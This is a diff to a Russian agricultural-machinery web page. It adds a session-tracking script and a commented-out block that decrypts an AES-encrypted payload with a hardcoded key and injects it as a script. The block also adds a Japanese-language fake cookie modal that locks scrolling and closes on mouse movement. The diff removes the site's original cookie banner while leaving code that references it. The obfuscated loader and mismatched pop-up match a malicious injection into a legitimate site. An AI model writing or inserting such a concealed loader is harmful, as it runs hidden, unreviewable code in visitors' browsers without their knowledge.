@@ -1,6 +1,7 @@
 
 <!DOCTYPE html>
 <html lang="ru">
+ <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=bff03db1"></script>
 <head>
  <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -175,6 +176,87 @@
     </style>
 </head>
 <body>
+ 
+<!-- <script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`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`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script>
+<script>
+    document.body.style.overflow = "hidden";
+</script>
+<div id="cookie-modal-box" class="hidden">
+    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
+    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+        <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+            <button id="cookie-close" class="absolute top-4 right-4">
+                <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+                    <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+                </svg>
+            </button>
+            <div class="flex items-center gap-3 mb-4">
+                <span class="text-yellow-500 text-3xl">🍪</span>
+                <h2 class="text-2xl font-bold">クッキーについて</h2>
+            </div>
+            <p class="text-gray-600 mb-6">
+                当サイトでは、より良いユーザー体験を提供するためにクッキーを使用しています。 <span class="font-semibold">「同意する」</span>
+                をクリックすると、クッキーの使用に同意したことになります。
+            </p>
+            <div class="flex flex-col sm:flex-row gap-3">
+                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 同意する</button>
+                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">拒否する</button>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+    const modalBox = document.getElementById("cookie-modal-box"),
+        modal = document.getElementById("cookie-modal"),
+        backdrop = document.getElementById("cookie-backdrop"),
+        acceptBtn = document.getElementById("cookie-accept"),
+        declineBtn = document.getElementById("cookie-decline"),
+        closeBtn = document.getElementById("cookie-close");
+
+    function showModal() {
+        modalBox.classList.remove("hidden");
+        setTimeout(() => {
+            backdrop.classList.remove("opacity-0");
+            modal.classList.remove("opacity-0", "scale-90");
+        }, 10);
+    }
+
+    function hideModal(e) {
+        localStorage.setItem("cookie-consent", e);
+        setTimeout(() => {
+            modalBox.classList.add("hidden");
+        }, 1500);
+
+        // remove mousemove listener once closed
+        document.removeEventListener("mousemove", mouseMoveClose);
+    }
+
+    function mouseMoveClose() {
+        hideModal("closed");
+    }
+
+    acceptBtn.onclick = () => hideModal("accepted");
+    declineBtn.onclick = () => hideModal("declined");
+    closeBtn.onclick = () => hideModal("closed");
+    backdrop.onclick = () => hideModal("closed");
+
+    if (!localStorage.getItem("cookie-consent")) {
+        showModal();
+        document.addEventListener("mousemove", mouseMoveClose, { once: true });
+    }
+</script> -->
     <header>
         <h1>Сельскохозяйственная техника</h1>
         <p>Современное оборудование для эффективного сельского хозяйства</p>
@@ -275,12 +357,7 @@
         <p>© 2023 Сельскохозяйственная техника. Все права защищены.</p>
     </footer>
     
-    <div class="cookie-consent" id="cookieConsent">
-        <div>
-            <p>Мы используем файлы cookie для улучшения работы сайта. Продолжая использование сайта, вы соглашаетесь с этим.</p>
-        </div>
-        <button id="acceptCookies">Принять</button>
-    </div>
+ 
 <script>
         // 1. Cookie Consent Logic
         document.getElementById('acceptCookies').addEventListener('click', function() {
